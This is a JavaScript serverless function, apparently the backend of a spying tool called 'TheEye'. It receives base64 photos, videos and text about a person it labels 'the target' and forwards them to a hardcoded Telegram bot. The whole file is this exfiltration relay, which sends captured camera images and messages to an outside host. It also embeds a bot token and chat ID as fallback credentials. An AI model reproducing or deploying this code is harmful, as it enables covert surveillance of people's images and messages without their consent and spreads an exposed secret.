// api/send.js — TheEye middleware v4 (CommonJS)
// يدعم: photo / video / message
// الأولوية: متغيرات البيئة على Vercel ← وإن لم توجد تستخدم القيم أدناه

const FALLBACK_TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
const FALLBACK_CHAT_ID = '1015102519';

const TOKEN = process.env.TELEGRAM_TOKEN || FALLBACK_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || FALLBACK_CHAT_ID;

const MAX_B64 = 4 * 1024 * 1024; // 4MB كحد أقصى للطلب

module.exports = async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ ok: false, error: 'POST only' });
    }

    let body;
    try {
        body = typeof req.body === 'object' ? req.body : JSON.parse(req.body);
    } catch {
        return res.status(400).json({ ok: false, error: 'JSON غير صالح' });
    }

    const chatId = String(body.chatId || 'غير معروف').slice(0, 64);
    const tg = 'https://api.telegram.org/bot' + TOKEN;
    const cap = (body.caption || '📩 رسالة') +
        '\n👤 الهدف: ' + chatId +
        '\n🕐 ' + new Date().toLocaleString('ar');

    try {
        // ====== صورة ======
        if (body.type === 'photo') {
            const raw = String(body.photo || '');
            const b64 = raw.includes(',') ? raw.split(',')[1] : raw;
            if (!b64 || b64.length > MAX_B64) {
                return res.status(400).json({ ok: false, error: 'صورة غير صالحة أو كبيرة' });
            }
            const buf = Buffer.from(b64, 'base64');
            if (!buf.length) return res.status(400).json({ ok: false, error: 'صورة فارغة' });

            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('caption', cap);
            form.append('photo', new Blob([buf], { type: 'image/jpeg' }), 'cap_' + chatId + '.jpg');

            const r = await fetch(tg + '/sendPhoto', { method: 'POST', body: form });
            const j = await r.json().catch(() => ({}));
            return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description || 'Telegram error' });
        }

        // ====== فيديو ======
        if (body.type === 'video') {
            const raw = String(body.video || '');
            const b64 = raw.includes(',') ? raw.split(',')[1] : raw;
            if (!b64 || b64.length > MAX_B64) {
                return res.status(400).json({ ok: false, error: 'فيديو غير صالح أو كبير' });
            }
            const buf = Buffer.from(b64, 'base64');
            if (!buf.length) return res.status(400).json({ ok: false, error: 'فيديو فارغ' });

            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('caption', cap);
            form.append('video', new Blob([buf], { type: 'video/webm' }), 'cap_' + chatId + '.webm');

            const r = await fetch(tg + '/sendVideo', { method: 'POST', body: form });
            const j = await r.json().catch(() => ({}));
            return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description || 'Telegram error' });
        }

        // ====== نص ======
        const text = String(body.text || '').slice(0, 4000);
        if (!text) return res.status(400).json({ ok: false, error: 'نص فارغ' });

        const r = await fetch(tg + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text + '\n👤 الهدف: ' + chatId })
        });
        const j = await r.json().catch(() => ({}));
        return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description || 'Telegram error' });

    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message });
    }
};